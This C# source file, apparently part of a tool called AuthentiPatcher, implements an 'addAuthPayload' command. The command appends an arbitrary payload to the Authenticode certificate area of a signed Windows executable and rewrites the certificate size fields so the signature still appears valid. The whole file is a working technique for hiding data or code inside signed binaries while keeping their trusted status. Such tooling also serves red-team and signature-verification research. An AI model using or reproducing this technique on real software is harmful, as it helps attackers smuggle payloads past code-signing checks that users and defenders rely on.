using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace AuthentiPatcher
{
    class AddPayloadCommand
    {
        public void Process(string[] args)
        {
            if (args.Length != 4)
            {
                P.Info("addAuthPayload usage:");
                P.Info("  authentipatch addAuthPayload <inputfile> <payloadFile> <outputFile>");
                P.Info("    PayloadFile size should be a multipe of 8, because of PE format.");
                return;
            }

            var inputFile = args[1];
            var outputFile = args[3];
            var payloadFile = args[2];

            using (var parser = new PeParser(inputFile))
            {
                parser.Parse();

                var payload = File.ReadAllBytes(payloadFile);
                PatchAuthenticode(parser, inputFile, outputFile, payload);
            }
        }

        static void PatchAuthenticode(PeParser parser, string inputFile, string outputFile, byte[] payload)
        {
            if (payload.Length % 8 != 0)
            {
                P.Error($"Payload length must be multiple of 8 (was {payload.Length})");
                return;
            }

            // This technique won't work if the target exe has a debug symbols section after the certificates area, 
            // it will overwrite that and the signature will not be valid anymore.

            var certificateSizeField = parser.Find(null, "Size of Certificate table").FirstOrDefault();
            var certificateStartField = parser.Find(null, "Certificate table").FirstOrDefault();
            var winCertificateLenField = parser.Find("WIN_CERTIFICATE", "Length").FirstOrDefault();

            if (certificateSizeField == null || certificateStartField == null || winCertificateLenField == null)
            {
                P.Error("This file has no signature");
                return;
            }

            P.Info($"Patching authenticode with {payload.Length} new bytes.");

            // Make a copy of the original file
            File.Copy(inputFile, outputFile, true);

            // Then patch the copied file
            using (var w = File.OpenWrite(outputFile))
            {
                var certificateStart = (int)certificateStartField.ULongValue;
                var certificateSize = (int)certificateSizeField.ULongValue;
                var endOffset = certificateStart + certificateSize;

                uint newSize = (uint)(certificateSize + payload.Length);
                var newSizeBytes = BitConverter.GetBytes(newSize);

                Patch(w, newSizeBytes, winCertificateLenField.Offset);
                Patch(w, newSizeBytes, certificateSizeField.Offset);
                Patch(w, payload, endOffset);
            }

            P.Success($"Patched successfully. {payload.Length} of payload added at the end the file.");
        }

        static void Patch(Stream w, byte[] data, long offset)
        {
            P.Info($"Patching {data.Length} bytes at offset {offset}");
            w.Seek(offset, SeekOrigin.Begin);
            w.Write(data);
            P.Success("Patched");
        }

        static int RoundUp(int x)
        {
            return ((x + 7) & (-8));
        }

    }
}
